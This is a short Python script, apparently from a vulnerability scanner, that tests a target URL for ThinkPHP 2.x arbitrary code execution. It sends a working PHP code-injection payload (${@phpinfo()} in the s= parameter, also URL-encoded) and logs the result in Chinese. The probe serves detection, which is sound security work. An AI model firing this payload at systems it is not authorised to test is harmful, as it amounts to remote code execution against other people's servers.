# -*-coding:utf-8-*-
import requests

class tp2:
    def check_tp2(self, url):
        url_1 = url + r"/index.php?s=/index/index/name/${@phpinfo()}"
        url_2 = url + r"/index.php?s=/index/index/name/$%7B@phpinfo()%7D"
        re1 = requests.get(url_1).text
        re2 = requests.get(url_2).text
        if "PHP Version" in re1 or "PHP Version" in re2:
            print("    \033[0;36;31m存在Thinkphp 2.x 任意代码执行漏洞!\033[0m")
            with open("tp_check.log", "a+") as res:
                res.write("存在Thinkphp 2.x 任意代码执行漏洞!\n\n")
            res.close()